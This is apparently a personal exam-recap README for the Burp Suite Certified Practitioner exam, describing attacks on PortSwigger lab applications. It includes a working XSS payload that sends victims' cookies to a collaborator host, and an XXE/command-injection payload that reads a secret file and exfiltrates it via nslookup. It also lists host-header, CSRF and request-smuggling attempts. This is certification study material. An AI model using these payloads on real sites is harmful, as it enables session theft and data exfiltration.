# BSCP-Recapitulation
This Repo contains Burp Suite Certification Practitioner Recapitulation of Mine


## BSCP 1<sup>st</sup> Exam
I have taken my first BSCP exam on **December 24th, 2024**. I failed on App 2 without success to address any vulnerabilities. Please find the details in the following points:

### Application 1 - EXPLOITED ❤️‍🔥
- Stage 1:
  - Features:
    The features mentioned here are the visible functional that we can exploit for stage 1
    1. Search in Homepage
    2. Comment on the Blog Post
    3. Login Form
    4. Forgot Password
   
  - Vulnerability: XSS with Blocked Tags
  - How to trigger for the first time:
    ```javascript
    <script>alert(1)</script>
    ```
  - After scanning the allowed tags and events, I used this payload to ensure it works:
    ```javascript
    <body onload=document.location='https://collaborator.oastify.com/?c='+document.cookie tabindex=1>
    ```
  - I attached this *URL Encoded* payload to the Exploit Server:\
    a. Bare Payload
    ```javascript
    <script>Document.location = 'https://WEB_ID.web-security-academy.net/?query=<body onload=document.location='https://collaborator.oastify.com/?c='+document.cookie tabindex=1>#x';</script>
    ```
    b. URL encoded Payload (You can copy the URL from HTTP history )
    ```javascript
    <script>Document.location="https://WEB_ID.web-security-academy.net/?searchTerm=%3Cbody+onload%3Ddocument.location%3D%27https%3A%2F%2Fcollaborator.oastify.com%2F%3Fc%3D%27%2Bdocument.cookie+tabindex%3D1%3E#x"</script>
    ```

- Stage 2:
  - Features:
    The features mentioned here are the additional visible functional after passing the `stage 1`
    1. Update Email
       
  - Vulnerability: JSON `roleId` in Response Body of Update Email.
  - How to Exploit:
    1. Send this request to the Intruder
    2. Brute the `roleId`
    3. Observe the result with statusCode `302`
   
- Stage 3:
  - Features:
    The features mentioned here are the visible functional in `Admin Panel` Menu
    1. XML User Import
  - Vulnerability: XXE Injection
  - How to Exploit:
    I used the following payload to exploit this vulnerability (I URL-Encoded the Ampersand(&) character):
    ```XML
    <?xml version="1.0" encoding="UTF-8"?>
    <users>
      <user>
        <username>Exp1</username>
        <email>exp1@domain.com</email>
      </user>
     <user>
        <username>Exp2</username>
        <email>exp2@example.com%26`nslookup -q=cname $(cat /home/carlos/secret).bfuxae8oi1ac1lrm5l2hgmwh68c00qof.oastify.com`</email>
      </user>
    </users>
    ```

### Application 2 - UNEXPLOITED 😢
- Stage 1:
  - Features:
    The features mentioned here are the visible functional that we can exploit for stage 1
    1. Search in Homepage
    2. Login Form
    3. Forgot Password
       
  - Walkthrough:
    1) I have Performed Host Header Attack using the following kind of techniques:
       - Enumerate using IP address: **NOT VULNERABLE**
       - Exploit using `X-headers`: **NOT VULNERABLE** (Not Reflected to the Exploit Server)
       - Exploit by supplying an absolute URL in the request line as follows `GET https://WEB_ID.WEB_ID.web-security-academy.net/`: **NOT VULNERABLE**. Please refer to [this lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)
       - Exploit using duplicated host > **NOT VULNERABLE**
         > Not Reflected to the Exploit Server
       - Exploit using connection state > **NOT VULNERABLE**
         > it seems it was not able to use the connection header. Since `Connection` was not reflected in the response.
    2) Brute forcing user > **NOT VULNERABLE**.
         > There is no response with statusCode `302`)
    3) <a name="walkthrough-number-3"></a>I have found a different `Response Message` in the **Forgot Password** feature that indicates whether the user exists.
    4) I have performed CSRF Attack:
       - modified the CSRF token: **NOT VULNERABLE**
       - Removed CSRF token and Parameter: **NOT VULNERABLE**
       - swap the CSRF token with the value from the other session: **NOT VULNERABLE**
    5) Web Cache: **NOT VULNERABLE** (There is no `Tracking.js` and no `Cache` header in Response).
    6) I Have Performed HTTP Request Smuggling:
       - unable to use `CL` and `TE` Headers in a request: **NOT VULNERABLE** (Indicates we can direct to use **H2 or HTTP2** Techiniques)
       - Performed H2.TE; H2.CL; H2 Smuggling CRLF; CL.0 Req: **NOT VULNERABLE** (always GET `200` response, But It seems I have not exploited these techniques correctly).
    7) I have scanned using the `Launch All Scans` option in the **HTTP Request Smuggler** Extension. In addition, I only got a `dual path` vulnerability. In my opinion, we cannot consider that scan result as a potential vulnerability.
       > I will describe the reason in the next point).

  - Potential Vulnerability:
    In this section, I am trying to summarize or classify any potential vulnerabilities and any techniques that I have not performed prior BSCP Exam.
    1) H2 Request Splitting via CRLF Injection: **The Most potential vulnerability**.\
       > I have tried to find the potential labs in **Port Swigger Academy** that have similarities with my case in the exam. And I have found the closest potential in [this lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection) with `H2 Request Splitting via CRLF Injection` technique. The reason is When solving that lab, I only got the `dual path` vulnerability in the scan result compared to other `HTTP/2 Request Smuggling` techniques.
    2) HTTP/2-TE. Please refers to [this lab](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling).
    3) Maybe Obfuscating `TE` Header using payload in **BotesJuan**'s Repo would be a good option.
       > Please note not to duplicate this header. Just use 1 `TE` Header since duplicated `TE` Header is not allowed).
    
    4) Perform H2.CL Technique refers to [this lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling).
    5) Perform CL.0 Technique refers to [this lab](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling).
    6) Brute Force the **Password** using the potential `usernames` based on the `Walkthrough` [number 3](#walkthrough-number-3).

    

    
     
